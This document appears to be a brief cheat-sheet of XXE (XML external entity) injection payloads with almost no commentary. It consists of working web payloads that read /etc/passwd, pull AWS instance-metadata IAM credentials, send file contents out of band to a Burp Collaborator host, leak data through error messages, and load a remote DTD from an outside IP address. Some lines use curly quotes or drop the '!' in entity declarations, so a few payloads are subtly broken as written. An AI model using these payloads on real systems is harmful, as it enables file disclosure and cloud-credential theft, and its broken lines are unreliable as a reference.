
```
`<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>` --> &xxe;

<!DOCTYPE foo [ <!ENTITY ioo SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]

_<ENTITY % file SYSTEM “file:///etc/passwd”> 
<ENTITY % eval “<ENTITY &#x25; exfil SYSTEM ‘http://burpcollaborator.oastify.com/?_**_x_**_=%file;’>”> %eval; %exfil;_

<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;

<!DOCTYPE roottag [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://122.180.248.81/payload.dtd">
  %dtd;
]>
<GeneralSearch>&send;</GeneralSearch>

```



For the external entity , the payload became **<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>**

For the internal entity , the payload became **<!DOCTYPE foo [ <!ENTITY xxe "my name is mithun"> ]>**
